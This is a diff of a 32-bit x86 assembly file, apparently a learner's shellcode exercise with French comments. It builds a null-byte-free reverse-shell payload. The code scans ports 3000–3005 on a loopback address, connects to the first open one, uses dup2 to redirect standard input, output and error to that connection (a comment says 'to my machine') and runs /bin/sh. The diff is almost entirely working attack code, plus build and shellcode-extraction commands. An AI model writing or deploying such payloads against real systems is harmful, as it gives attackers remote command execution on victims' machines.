@@ -9,81 +9,77 @@ section .text
 
 ; nc -l -p 3005 -s 127.1.1.1
 ; m2elf.pl -in test-asm.m (test-asm.m ==> shellcode)
+; nasm -f elf32 portscan-shellcode.s && ld -m elf_i386 portscan-shellcode.o && strace ./a.out
 
 _start:
 
-    sub eax, eax        ;; 29 c0
-    push eax            ;; 50
-    mov ax, 0x0167      ;; 66 B8 67 01
+    ;; Création de la socket
+    sub eax, eax            ;; eax=0
+    mov ax, 0x0167          ;; socket
+    xor edx, edx            ;; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
+    mov ecx, edx            ;; ecx=0
+    inc ecx                 ;; type : SOCK_STREAM (TCP)
+    mov ebx, ecx            ;; ebx=1
+    inc ebx                 ;; domaine : AF_INET (IPv4)
+    int 0x80                ;; cd 80
 
-    pop ebx             ;; 5b
-    mov bl, 0x2         ;; B3 02
-
-    xor ecx, ecx        ;; 31 c9
-    inc ecx             ;; 41
-    
-    xor edx, edx        ;; 31 D2
-    int 0x80            ;; cd 80
     mov ebx, eax        ;; 89 C3
 
     ; Scan de port + Connexion ----------------------------------------------------------------------------------------------------------------------
-    xor esi, esi            ;; 31 f6 
+    xor esi, esi            ;; esi=0 && incrémente le port
     _while_port_scanning:   ; Scan port
-        push 0x0101017f     ; IP ;; 68 7f 01 01 01
-        sub eax, eax        ;; 29 c0 
+        push 0x0101017f     ; IP : 127.1.1.1
+        sub eax, eax        ;; eax=0 (si pas de connexion eax = 0xffffffff = -1) 
 
-        mov di, 0x0bb8      ;; 66 bf b8 0b
-        add edi, esi        ;; 01 f7
-        rol di, 8           ;; 66 c1 c7 08
-        push di             ;; 66 57
+        mov di, 0x0bb8      ;; PORT = 3000 (pas de htons)
+        add edi, esi        ;; Incrémentation du port avec esi
+        rol di, 8           ;; Rotation de di (pour simuler le htons)
+        push di             ;; Push du port dans la stack
 
-        mov dl, 0x2         ;; b2 02
-        push dx             ;; 66 52
+        push word 0x2       ;; AF_INET (connexion)
 
-        mov ax, 0x16a       ;; 66 b8 6a 01
-        
-        mov ecx, esp        ;; 89 e1
-        mov dl, 0x10        ;; b2 10
-        int 0x80            ;; cd 80
+        mov ax, 0x16a       ;; connect
+        mov ecx, esp        ;; Struct sockaddr *addr
+        mov dl, 0x10        ;; size de sockaddr *addr
+        int 0x80            ;; Création de la connexion (eax = 0 si tout s'est bien passé)
    
-        test eax, eax       ;; 85 c0     ; si il n'y a pas d'erreur, la connection a eut lieu.
-        jnz _port_unused    ;; 75 02
+        test eax, eax       ;; si il n'y a pas d'erreur, la connection a eut lieu. (_end_connect_to_ip_port)
+        jnz _port_unused    ;; jump si le test != 0 => _port_unused
         jmp _end_connect_to_ip_port ;; eb 08
         
         _port_unused : 
-            inc esi         ;; 46
-            cmp esi, 0x5    ;; 83 fe 05     ; Si il y a encore des "try", continuer dans le while sinon, quitter le programme.
-            jle _while_port_scanning    ;; 7e d3 
-            jmp _no_port_to_connect_to_ip   ;; eb 23
+            inc esi         ;; Incrémente esi
+            cmp esi, 0x5    ;; Si il y a encore des "try", continuer dans le while (_while_port_scanning) sinon, quitter le programme (_no_port_to_connect_to_ip).
+            jle _while_port_scanning    
+            jmp _no_port_to_connect_to_ip   
         
         _end_connect_to_ip_port:
 
 
-    ;; pour ne pas avoir de nullbyte avec "int 0x80" ET "add eax, 0x3"
-    push eax            ;; 50
-    push 0x68732f6e     ;; 68 6e 2f 73 68
-    push 0x69622f2f     ;; 68 2f 2f 62 69
+    push eax            ;; push 0 si connexion a été emise.
+    push 0x68732f6e     ;; hs/n
+    push 0x69622f2f     ;; ib//
 
-    add eax, 0x3        ;; 04 03
-    mov ecx, eax        ;; 89 C1
+    add al, 0x3         ;; Ajout de 3 dans al pour la boucle du dup2
+    mov ecx, eax        ;; Remplace tout le contenu du registre "ecx" par 0x3
 
+    ;; Dup2 (duplication) pour stdin, stdout, stderr (redirige la stdin-stdout-stderr de la victime vers ma machine)
     not_finish_dup:     ;; jump ==> 0xff - 0x06 => 0xf9 (0x06 == nombre de caractères pour atteindre le label "not_finish_dup")
-    mov al, 0x3f        ;; B0 3f
-    dec ecx             ;; 49
-    int 0x80            ;; cd 80
-    jnz not_finish_dup  ;; 75 f9
+    mov al, 0x3f        ;; dup2
+    dec ecx             ;; stderr-stdout-stdin
+    int 0x80            ;; 
+    jnz not_finish_dup  ;; Si ecx != 0 => goto not_finish_dup
 
-    mov eax, ecx        ;; 89 C8
-    mov dl, 0x0b        ;; b2 0b
-    xchg eax, edx       ;; 92       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 
+    ;; execve("/bin/sh", 0, 0) ==> eax=0x0b, ebx=/bin/sh, ecx=0, edx=0
+    mov eax, ecx        ;; eax=0
+    mov dl, 0x0b        ;; edx=0x0b
+    xchg eax, edx       ;; eax=0x0b,edx=0       ;; Etant donné que mov eax, 0x0b (b0 03), la solution qu'on a trouvé est d'inverser le stockage des données pour eax & edx (vu que mov edx, 0x0b ==> b2 0b) puis de les remettre à leur place avec xchg 
+    mov ebx, esp        ;; ebx=/bin/sh
+    int 0x80            ;; 
 
-    ; lea ebx, [esp]    ;; 8D 1C 24
-    mov ebx, esp        ;; 89 e3
-    int 0x80            ;; cd 80
-
-    ;; voir si après le execv, le exit sert à quelque chose
+    ;; Exit 0
     _no_port_to_connect_to_ip:
-        xor eax, eax      ;; 31 c0
-        inc eax           ;; 40
-        xor ebx, ebx      ;; 31 db
-        int 0x80          ;; cd 80
+        xor eax, eax      ;; 
+        inc eax           ;; 
+        xor ebx, ebx      ;; 
+        int 0x80          ;; 
